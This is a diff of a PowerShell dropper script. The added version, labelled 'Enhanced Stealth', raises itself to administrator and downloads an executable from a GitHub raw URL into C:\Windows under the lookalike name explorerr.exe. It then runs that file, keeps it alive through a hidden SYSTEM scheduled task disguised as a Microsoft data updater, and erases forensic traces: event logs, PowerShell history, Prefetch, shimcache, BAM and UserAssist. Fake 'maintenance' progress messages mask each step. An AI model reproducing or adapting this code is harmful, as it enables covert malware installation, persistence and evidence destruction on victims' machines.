@@ -1,197 +1,184 @@
-# โค้ดที่ปรับปรุงแล้วสำหรับจัดการกรณี 16-bit application
-Write-Host "+ Program Installer & Runner (Disguised Install)"
+# Menu Selection
+Write-Host "+ Utility Runner (Enhanced Stealth)"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
 $choice = Read-Host "Enter choice (1/2)"
 
-# Check for Administrator rights
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Restarting with administrator privileges..."
+    Write-Host "Restarting with elevated privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
     exit
 }
 
-# Define paths and variables
-$InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
-$SexeDestination = Join-Path $InstallPath "dwmHost.exe" 
-$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe"
+$InstallPath = $env:windir
+$SexeDestination = Join-Path $InstallPath "explorerr.exe" 
+$SexeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/EEEEEEEEEEEEEEEEE.exe" 
+$TaskName = "\Microsoft\Windows\SystemDataUpdater"
 
-# Install & Run Mode - UPDATED FOR 16-BIT ISSUE
-if ($choice -eq "1") {
-    Write-Host "`nStarting installation..."
-
-    # Create installation folder
-    Write-Host "Checking/Creating installation folder in ProgramData..."
-    if (-not (Test-Path $InstallPath)) {
-        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
-        Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
+function Write-SimulationProgress {
+    param(
+        [string]$Message,
+        [int]$Duration = 3
+    )
+    Write-Host "$Message " -NoNewline -ForegroundColor Cyan
+    for ($i = 0; $i -lt $Duration; $i++) {
+        Write-Host "." -NoNewline -ForegroundColor Green
+        Start-Sleep -Milliseconds 500
     }
+    Write-Host ""
+}
 
-    # Download executable
-    Write-Host "Downloading and installing executable..."
-    $downloadSuccess = $false
+function Set-Persistence {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$PathToExe
+    )
+    Write-Host "Starting system service registration..." -ForegroundColor Cyan
     
-    try {
-        # Using WebClient for download
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $webClient.DownloadFile($SexeUrl, $SexeDestination)
-        $downloadSuccess = $true
-        Write-Host "Download completed successfully!" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
-        exit
-    }
+    $Action = New-ScheduledTaskAction -Execute $PathToExe
+    $Trigger = New-ScheduledTaskTrigger -AtStartup
+    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+    $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden
 
-    # Verify file
-    if (-not (Test-Path $SexeDestination)) {
-        Write-Host "ERROR: Downloaded file not found!" -ForegroundColor Red
-        exit
-    }
-
-    $fileSize = (Get-Item $SexeDestination).Length
-    if ($fileSize -eq 0) {
-        Write-Host "ERROR: Downloaded file is empty!" -ForegroundColor Red
-        exit
-    }
-
-    Write-Host "File verification passed. Size: $fileSize bytes" -ForegroundColor Green
-
-    # Check if file is 16-bit and provide solutions
-    Write-Host "Checking file compatibility..."
+    Write-SimulationProgress -Message "Processing service request" -Duration 4
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Performs critical system data synchronization." -Force | Out-Null
     
-    # Method to detect 16-bit executable (basic check)
-    try {
-        $fileInfo = Get-Item $SexeDestination
-        $fileAge = (Get-Date) - $fileInfo.CreationTime
-        
-        Write-Host "File created: $($fileInfo.CreationTime)" -ForegroundColor Yellow
-        Write-Host "File size: $fileSize bytes" -ForegroundColor Yellow
-        
-        # If file is suspiciously old or small, it might be 16-bit
-        if ($fileSize -lt 200000) {  # Less than 200KB
-            Write-Host "WARNING: File appears to be very small - may be incompatible" -ForegroundColor Red
-        }
-    }
-    catch {
-        Write-Host "Could not analyze file properties" -ForegroundColor Yellow
-    }
+    Write-Host "Service registration complete." -ForegroundColor Green
+}
 
-    # Enhanced execution with 16-bit compatibility handling
-    Write-Host "`nAttempting to start program with compatibility modes..."
-    $runSuccess = $false
-    
-    # Method 1: Try with NTVDM emulation (for 16-bit apps)
-    try {
-        Write-Host "Attempting with compatibility mode..."
-        # Using cmd with compatibility flags
-        $arguments = "/c `"$SexeDestination`""
-        Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -WindowStyle Hidden
-        Start-Sleep -Seconds 3
-        
-        # Check if process is running
-        $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
-        if ($processes) {
-            $runSuccess = $true
-            Write-Host "Program started successfully via CMD compatibility." -ForegroundColor Green
-        }
-    }
-    catch {
-        Write-Host "Compatibility mode execution failed." -ForegroundColor Yellow
-    }
-    
-    # Method 2: Using Windows Compatibility Troubleshooter
-    if (-not $runSuccess) {
-        try {
-            Write-Host "Attempting Windows compatibility troubleshooter method..."
-            $compatScript = @"
-                try {
-                    `$path = '$SexeDestination'
-                    `$psi = New-Object System.Diagnostics.ProcessStartInfo
-                    `$psi.FileName = 'mshta.exe'
-                    `$psi.Arguments = "vbscript:Execute(`"CreateObject(`"`"Shell.Application`"`").ShellExecute(`"`"`$path`"`"`)(window.close)`")"
-                    `$psi.UseShellExecute = `$false
-                    [System.Diagnostics.Process]::Start(`$psi)
-                } catch { }
-"@
-            Invoke-Expression $compatScript
-            Start-Sleep -Seconds 3
-            
-            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
-            if ($processes) {
-                $runSuccess = $true
-                Write-Host "Program started via compatibility workaround." -ForegroundColor Green
-            }
-        }
-        catch {
-            Write-Host "Compatibility workaround failed." -ForegroundColor Yellow
-        }
-    }
-    
-    # Method 3: Direct execution with error handling
-    if (-not $runSuccess) {
-        try {
-            Write-Host "Attempting direct execution with error suppression..."
-            cmd.exe /c "start `"`" `"$SexeDestination`""
-            Start-Sleep -Seconds 3
-            
-            $processes = Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue
-            if ($processes) {
-                $runSuccess = $true
-                Write-Host "Program started via direct CMD." -ForegroundColor Green
-            }
-        }
-        catch {
-            Write-Host "Direct CMD execution failed." -ForegroundColor Yellow
-        }
-    }
-
-    # Final status and instructions
-    if ($runSuccess) {
-        Write-Host "`n✅ Program is now running in background." -ForegroundColor Green
-        Write-Host "Location: $SexeDestination" -ForegroundColor Cyan
+function Remove-Persistence {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$TaskPath
+    )
+    Write-Host "Removing system service..."
+    if (Get-ScheduledTask -TaskName $TaskPath -ErrorAction SilentlyContinue) {
+        Write-SimulationProgress -Message "Unregistering task" -Duration 4
+        Unregister-ScheduledTask -TaskName $TaskPath -Confirm:$false
+        Write-Host "Task $TaskPath removed." -ForegroundColor Green
     } else {
-        Write-Host "`n⚠️  Program may have compatibility issues:" -ForegroundColor Red
-        Write-Host "   - File appears to be 16-bit application" -ForegroundColor Yellow
-        Write-Host "   - Windows 64-bit doesn't support 16-bit apps" -ForegroundColor Yellow
-        Write-Host "   - File is installed at: $SexeDestination" -ForegroundColor Cyan
-        Write-Host "`nYou may need to:" -ForegroundColor White
-        Write-Host "   1. Find a 64-bit version of this application" -ForegroundColor White
-        Write-Host "   2. Use a virtual machine with 32-bit Windows" -ForegroundColor White
-        Write-Host "   3. Contact the developer for updated version" -ForegroundColor White
+        Write-Host "Task $TaskPath not found." -ForegroundColor Yellow
     }
+}
 
-    Write-Host "`nInstallation process completed." -ForegroundColor Green
-
-# Clean Mode
-} elseif ($choice -eq "2") {
-    Write-Host "Cleanup installation..."
-
-    # Stop the process if running
-    Write-Host "Stopping dwmHost process..."
+function Clear-Traces {
+    Write-Host "Initiating system cleanup routines..." -ForegroundColor Yellow
+    
+    Write-SimulationProgress -Message "Running essential maintenance" -Duration 7
+    
     try {
-        Get-Process -Name "dwmHost" -ErrorAction SilentlyContinue | Stop-Process -Force
-        Write-Host "Process stopped." -ForegroundColor Green
-    }
-    catch {
-        Write-Host "No running process found." -ForegroundColor Yellow
+        $PSHistoryPath = (Get-PSReadLineOption).HistorySavePath
+        Remove-Item $PSHistoryPath -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $AutomaticDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"
+        $CustomDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"
+        Get-ChildItem -Path $AutomaticDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $CustomDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $PrefetchPath = Join-Path $env:windir "Prefetch"
+        Get-ChildItem -Path $PrefetchPath -Exclude "Layout.ini" -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+        Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, (Get-ItemProperty -Path $RunKey).'(default)', MRUList | ForEach-Object {
+            Remove-ItemProperty -Path $RunKey -Name $_.PSProperty.Name -ErrorAction SilentlyContinue
+        }
+    } catch {}
+
+    Write-Host "  -> Clearing system logs..."
+    try {
+        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
+            Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    
+    Write-Host "  -> Running deep registry cleanup..."
+    try {
+        $ShimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
+        Remove-ItemProperty -Path $ShimKey -Name "AppCompatCache" -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $BAMKey = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
+        Remove-Item -Path $BAMKey -Recurse -Force -ErrorAction SilentlyContinue
+        $UserAssistKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+        Remove-Item -Path $UserAssistKey -Recurse -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Write-Host "System maintenance complete." -ForegroundColor Green
+}
+
+if ($choice -eq "1") {
+    Write-Host "`nStarting operations..."
+    
+    Write-Host "Retrieving and preparing executable..."
+    try {
+        Write-SimulationProgress -Message "Downloading file" -Duration 8 
+        $tempfile = Join-Path $env:TEMP "temp_download.exe"
+        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
+
+        Write-Host "Moving file to system location: $SexeDestination" -ForegroundColor Yellow
+        Move-Item -Path $tempfile -Destination $SexeDestination -Force
+        
+        Write-Host "Executable installation complete." -ForegroundColor Green
+    } catch {
+        Write-Host "Installation failed: $_" -ForegroundColor Red
+        exit
     }
 
-    # Remove files and folder
-    if (Test-Path $SexeDestination) {
-        Remove-Item $SexeDestination -Force
-        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+    Set-Persistence -PathToExe $SexeDestination
+
+    Write-Host "Executing core application..."
+    try {
+        Write-SimulationProgress -Message "Executing explorerr.exe" -Duration 3
+        Start-Process -FilePath $SexeDestination
+        Write-Host "Program started." -ForegroundColor Green
+    } catch {
+        Write-Host "Execution failed: $." -ForegroundColor Red
     }
     
-    if (Test-Path $InstallPath) {
-        Remove-Item $InstallPath -Recurse -Force
-        Write-Host "Removed installation folder: $InstallPath" -ForegroundColor Green
+    Clear-Traces
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+
+} elseif ($choice -eq "2") {
+    Write-Host "Initiating system cleanup..."
+
+    Remove-Persistence -TaskPath $TaskName
+
+    Write-Host "Stopping core application process..."
+    try {
+        Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
+        Stop-Process -Name "explorerr" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2 
+        Write-Host "Process stop signal sent." -ForegroundColor Yellow
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
     }
 
+    Write-Host "Attempting to remove installed file..."
+    if (Test-Path $SexeDestination) {
+        try {
+            Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
+            Remove-Item $SexeDestination -Force
+            Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+        } catch {
+            Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
+        }
+    }
+    
     Write-Host "Cleanup completed." -ForegroundColor Green
 
 } else {
-    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
+    Write-Host "Invalid choice." -ForegroundColor Red
 }
